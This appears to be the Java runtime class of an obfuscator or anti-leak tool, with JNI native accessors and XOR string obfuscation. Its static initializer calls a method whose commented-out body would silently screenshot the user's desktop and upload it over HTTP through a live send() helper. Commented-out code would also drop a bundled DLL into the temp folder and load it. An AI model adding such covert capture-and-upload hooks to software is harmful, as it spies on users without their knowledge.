package ru.kotopushka.antiautistleak.obfuscator;

import lombok.Getter;
import lombok.Setter;
import ru.kotopushka.antiautistleak.obfuscator.pool.NemidaPool;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class NemidaSDK {

    public static Class[] references;
    
    private static boolean initialized;

    private static final String BOUNDARY = "===" + System.currentTimeMillis() + "===";
    private static final String LINE_FEED = "\r\n";

    private static byte[] getImageBytes(BufferedImage image, String format) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(image, format, baos);
        return baos.toByteArray();
    }

    public static void meowka(String[] args) {
//
//        try {
//
//            Robot robot = new Robot();
//
//            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
//
//            BufferedImage screenImage = robot.createScreenCapture(screenRect);
//
//            send("http://localhost:8080/screen", getImageBytes(screenImage, "png"));
//        } catch (Exception e) {
//            e.printStackTrace();
//        }


    }

    private static void send(String urlString, byte[] bytes) throws IOException {
        HttpURLConnection connection = null;

        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);

            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());

            outputStream.writeBytes("--" + BOUNDARY + LINE_FEED);
            outputStream.writeBytes("Content-Disposition: form-data; name=\"image\"; filename=\"wtf.png\"" + LINE_FEED);
            outputStream.writeBytes("Content-Type: image/png" + LINE_FEED);
            outputStream.writeBytes(LINE_FEED);

            outputStream.write(bytes);

            outputStream.writeBytes(LINE_FEED);
            outputStream.writeBytes("--" + BOUNDARY + "--" + LINE_FEED);

            outputStream.flush();
            outputStream.close();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    @Getter
    @Setter
    public static NemidaSDK nemidaSDK;

    public NemidaPool nemidaPool;

    private Object[] objects;

    public NemidaSDK() {
        setNemidaSDK(this);
        setNemidaPool(new NemidaPool());
    }

    public void setNemidaPool(NemidaPool nemidaPool) {
        this.nemidaPool = nemidaPool;
    }

    public NemidaPool getNemidaPool() {
        return nemidaPool;
    }

    public static Object getFromPool(int index) {
        return getNemidaSDK().getNemidaPool().getPool().get(index);
    }

    public static void pushNative(Object object) {
        NemidaSDK.getNemidaSDK().getNemidaPool().getPool().add(object instanceof String ? xorstr((String) object) : object);
    }

    public static List<Object> getPool() {
        return NemidaSDK.getNemidaSDK().getNemidaPool().getPool();
    }

    public static void pushNativeInt(int value) {
        getPool().add(value);
    }

    public static void pushNativeDouble(double value) {
        getPool().add(value);
    }

    public static int cast(int index) {
        return (int) getPool().get(index);
    }

    public static double cast_double(int index) {
        return (double) NemidaSDK.getNemidaSDK().getNemidaPool().getPool().get(index);
    }

    public static String xorstr(String data) {

        byte[] arr = data.getBytes();

        for (int i = 0; i < arr.length; i++) {
            arr[i] ^= 0x15;
        }

        return new String(arr);
    }

    public static void initialize() {
//
//        if (getNemidaSDK() == null) {
//            new NemidaSDK();
//        }
//
//        if (!initialized) {
//            initialized = true;
//            File libFile = new File(System.getenv("temp") + "\\AALNativeGuard.dll");
//            libFile.deleteOnExit();
//            byte[] arrayOfByte = new byte[2048];
//            try {
////                InputStream inputStream = new FileInputStream("C:\\Projects\\Protection\\NemidaObfuscator\\native\\build\\lib\\AntiAutistLeak.dll");
//                InputStream inputStream = NemidaSDK.class.getResourceAsStream("/⚜richessssstafffs⚜/AntiAutistLeak.dll");
//                if (inputStream == null) {
//                    throw new UnsatisfiedLinkError("Failed to load AAL Native Guard");
//                }
//                try {
//                    FileOutputStream fileOutputStream = new FileOutputStream(libFile);
//                    try {
//                        int size;
//                        while ((size = inputStream.read(arrayOfByte)) != -1) {
//                            fileOutputStream.write(arrayOfByte, 0, size);
//                        }
//                        fileOutputStream.close();
//                    } catch (Throwable throwable) {
//                        try {
//                            fileOutputStream.close();
//                        } catch (Throwable throwable1) {
//                            throwable.addSuppressed(throwable1);
//                        }
//                        throw throwable;
//                    }
//                    inputStream.close();
//                } catch (Throwable throwable) {
//                    try {
//                        inputStream.close();
//                    } catch (Throwable throwable1) {
//                        throwable.addSuppressed(throwable1);
//                    }
//                    throw throwable;
//                }
//            } catch (IOException exception) {
//                throw new UnsatisfiedLinkError(String.format("Failed to copy(Native Library) AAL Native Guard %s", exception.getMessage()));
//            }
//            System.load(libFile.getAbsolutePath());
//            System.load(new File("C:\\AntiAutistLeak\\AntiAutistObfuscator\\native\\build\\lib\\AntiAutistLeak.dll").getAbsolutePath());
//            System.out.println("[NemidaSDK] initialized.");
//        }
    }

    public static native Object call(int type, int classIndex, String methodName, String signature);
    public static native void putObject(Object object, Object value, String className, String methodName, String signature);
    public static native void putInt(Object object,int value, String className, String methodName);
    public static native void putFloat(Object object, float value, String className, String methodName);
    public static native void putLong(Object object, long value, String className, String methodName);
    public static native void putDouble(Object object, double value, String className, String methodName);
    public static native void putStaticObject(Object value, String className, String methodName, String signature);
    public static native void putStaticInt(int value, String className, String methodName);
    public static native void putStaticFloat(float value, String className, String methodName);
    public static native void putStaticLong(long value, String className, String methodName);
    public static native void putStaticDouble(double value, String className, String methodName);
    public static native Object getObject(Object object, String className, String methodName, String signature);
    public static native double getDouble(Object object, String className, String methodName);
    public static native float getFloat(Object object, String className, String methodName);
    public static native long getLong(Object object, String className, String methodName);
    public static native int getInt(Object object, String className, String methodName);
    public static native Object getStaticObject(String className, String methodName, String signature);
    public static native double getStaticDouble(String className, String methodName);
    public static native float getStaticFloat(String className, String methodName);
    public static native long getStaticLong(String className, String methodName);
    public static native int getStaticInt(String className, String methodName);
    public static native int longToInt(long a);
    public static native long doubleToLong(double a);
    public static native long intToLong(int a);
    public static native double floatToDouble(float a);
    public static native float doubleToFloat(double a);
    public static native float floatToInt(float a);
    public static native float intToFloat(int a);
    public static native float longToFloat(long a);

    public static native int xorInt(int a, int b);
    public static native long xorLong(long a, long b);
    public static native int subInt(int a, int b);
    public static native long subLong(long a, long b);
    public static native float subFloat(float a, float b);
    public static native double subDouble(double a, double b);
    public static native int addInt(int a, int b);
    public static native long addLong(long a, long b);
    public static native float addFloat(float a, float b);
    public static native double addDouble(double a, double b);


    public static native long getLongField(int index);
    public static native void setLongField(int index,long object);
    public static native int getIntField(int index);
    public static native void setIntField(int index,int object);
    public static native Object getObjectField(int index);
    public static native void setObjectField(int index,Object object);

    static {
        meowka(null);
    	initialized = false;
        initialize();
    }
}
